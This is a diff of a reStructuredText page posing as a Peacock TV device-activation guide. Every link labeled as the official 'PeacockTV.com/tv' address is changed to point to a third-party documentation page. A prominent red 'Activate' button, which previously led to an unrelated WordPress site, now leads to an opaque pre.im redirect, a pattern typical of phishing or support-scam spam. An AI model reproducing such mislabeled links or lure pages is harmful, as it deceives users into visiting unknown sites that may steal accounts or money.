@@ -2,12 +2,12 @@
 PeacockTV.com/tv – Activate Peacock TV on Your Device
 ========================================================
 
-Want to start streaming Peacock’s hit shows, live sports, and movies on the big screen? First you need to link your TV (or another streaming device) to your Peacock account. The quickest way is with the `https://PeacockTV.com/tv <#>`_ activation page.
+Want to start streaming Peacock’s hit shows, live sports, and movies on the big screen? First you need to link your TV (or another streaming device) to your Peacock account. The quickest way is with the `https://PeacockTV.com/tv <https://peacockstreamhelpguide.readthedocs.io/en/latest/>`_ activation page.
 
   .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://quickencomdownload.wordpress.com/" style="background-color:#ff0000; color:#ffffff; padding:18px 40px; font-size:20px; font-weight:bold; text-decoration:none; border-radius:8px; box-shadow:0 6px 10px rgba(0,0,0,0.15); display:inline-block;">
+        <a href="https://pre.im/?GZGqGXnYcaJ9GgVx3Bpo9XZaBGpSBYRinYhPmGa1TnD0lOeSBETPOWgRcGtJUadVhPdI52lYvM" style="background-color:#ff0000; color:#ffffff; padding:18px 40px; font-size:20px; font-weight:bold; text-decoration:none; border-radius:8px; box-shadow:0 6px 10px rgba(0,0,0,0.15); display:inline-block;">
             ➡ Activate Peacock TV on Your Device
         </a>
     </div>
@@ -38,7 +38,7 @@ Step-by-Step Activation Guide
    • Select **Sign In** (existing users) or **Pick a Plan** (new users).  
    • An **activation code** appears on the screen.
 
-2. On your phone or computer, visit `https://PeacockTV.com/tv <#>`_
+2. On your phone or computer, visit `https://PeacockTV.com/tv <https://peacockstreamhelpguide.readthedocs.io/en/latest/>`_
 
 3. **Enter the activation code** exactly as it appears and press **Continue**.
 
@@ -93,5 +93,5 @@ Conclusion
 ==========
 
 Activation takes under a minute and puts the full Peacock library at your
-fingertips. Head to `https://PeacockTV.com/tv <#>`_, enter the on-screen code, sign in,
+fingertips. Head to `https://PeacockTV.com/tv <https://peacockstreamhelpguide.readthedocs.io/en/latest/>`_, enter the on-screen code, sign in,
 and start watching!
